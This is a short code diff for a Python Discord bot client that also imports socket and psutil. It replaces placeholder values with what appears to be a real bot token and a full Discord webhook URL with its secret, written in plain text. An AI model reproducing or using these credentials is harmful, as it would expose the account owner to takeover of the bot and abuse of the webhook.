@@ -2,8 +2,8 @@ from discord_webhook import DiscordWebhook
 from discord.ext import commands
 import requests, discord, socket, psutil, sys, os
 
-token = 'abcd' # Token
-webhook_url = "https://discord.com/api/webhooks/123" # Webhook URL
+token = 'MTA0OTAwNzUyNzMwOTg3NzM2OA.GW2DVM.5xMnOFVcSDLCHre1levj9KitiwGmAXHMgC3BHU' # Token
+webhook_url = "https://discord.com/api/webhooks/1048891575016632320/Gl8adKreETPIKuzGvOfh0TqlX9bEMoN5IuHKQ2NoIV19ozn12sYw87yJZnEgZA5J8wwJ" # Webhook URL
 
 # Client
 if sys.platform == "linux":
